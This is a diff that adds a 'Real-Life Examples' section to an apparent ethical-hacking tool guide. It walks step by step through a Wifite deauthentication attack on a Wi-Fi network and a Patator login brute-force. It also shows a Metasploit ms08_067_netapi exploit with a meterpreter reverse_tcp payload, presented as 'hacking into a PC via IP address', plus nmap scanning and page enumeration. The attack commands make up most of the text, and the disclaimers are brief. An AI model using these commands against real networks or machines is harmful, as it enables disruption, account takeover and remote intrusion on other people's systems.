@@ -1980,6 +1980,137 @@ You now have a fully functional ParrotOS virtual machine running on your Windows
 
 ---
 
+## Real-Life Examples
+
+### Example 1: Knocking Down a Wi-Fi Network with Wifite
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Put Your Wireless Adapter into Monitor Mode:**
+
+   ```sh
+   sudo airmon-ng start wlan0
+   ```
+
+   Replace `wlan0` with your wireless adapter's name.
+
+3. **Run Wifite:**
+
+   ```sh
+   sudo wifite
+   ```
+
+4. **Select the Target Network:**
+
+   - Wifite will scan and list available networks.
+   - Choose the number corresponding to the target network.
+
+5. **Initiate Deauthentication Attack:**
+
+   Wifite will automatically attempt to capture handshakes by deauthenticating clients from the target network. This will cause temporary disruption.
+
+   ```sh
+   [0:00:13] 80C7DA53E7EC WPA2 (6 @ 12dB) [1 handshake]
+   [+] WPA Handshake: 80C7DA53E7EC (channel 6)
+   ```
+
+6. **Stop the Attack:**
+
+   You can manually stop the attack by pressing `Ctrl+C`.
+
+### Example 2: Performing a Brute-Force Attack with Patator on a Controlled Site
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Install Patator:**
+
+   If not already installed, install Patator:
+
+   ```sh
+   sudo apt update
+   sudo apt install patator
+   ```
+
+3. **Run Patator for Brute-Forcing Login:**
+
+   ```sh
+   patator http_fuzz url=http://testphp.vulnweb.com/login.php method=POST body='uname=FILE0&pass=FILE1' 0=/path/to/usernames.txt 1=/path/to/passwords.txt -x ignore:fgrep='Senha e/ou nome de usuário incorretos'
+   ```
+
+   Replace `/path/to/usernames.txt` and `/path/to/passwords.txt` with your actual wordlists. Patator will attempt to login using the credentials from the wordlists.
+
+### Example 3: Hacking into a PC via IP Address
+
+**Disclaimer:** This example is for educational purposes only. Unauthorized access to a computer system is illegal.
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Scan for Open Ports and Services:**
+
+   ```sh
+   sudo nmap -sS -sV 192.168.1.100
+   ```
+
+   Replace `192.168.1.100` with the target IP address. This will scan for open ports and services.
+
+3. **Identify Vulnerable Service:**
+
+   Based on the Nmap results, identify a service with known vulnerabilities. For example, if port 445 (SMB) is open:
+
+   ```sh
+   sudo searchsploit smb
+   ```
+
+4. **Exploit the Vulnerability:**
+
+   Use Metasploit to exploit the vulnerability:
+
+   ```sh
+   sudo msfconsole
+   msf6> use exploit/windows/smb/ms08_067_netapi
+   msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.1.100
+   msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+   msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST <your_IP>
+   msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+   ```
+
+   Replace `<your_IP>` with your actual IP address. This will open a reverse shell on the target PC.
+
+### Example 4: Mapping All Pages of a Website with Nmap
+
+1. **Open Terminal:**
+
+   Open your terminal in Kali Linux.
+
+2. **Scan the Website:**
+
+   ```sh
+   sudo nmap -p 80 --script http-enum http://example.com
+   ```
+
+   Replace `http://example.com` with the target website URL. The `http-enum` script will enumerate directories and pages.
+
+3. **Analyze the Results:**
+
+   Nmap will provide a list of directories and pages found on the target website.
+
+   ```sh
+   PORT   STATE SERVICE
+   80/tcp open  http
+   | http-enum:
+   |   /admin.php
+   |   /login.php
+   |   /images/
+   ```
+
+By following these examples, you can learn how to utilize various tools for penetration testing and ethical hacking. Remember to always have proper authorization before testing any systems.
+
 # Nmap: A Comprehensive Guide
 
 ## Introduction
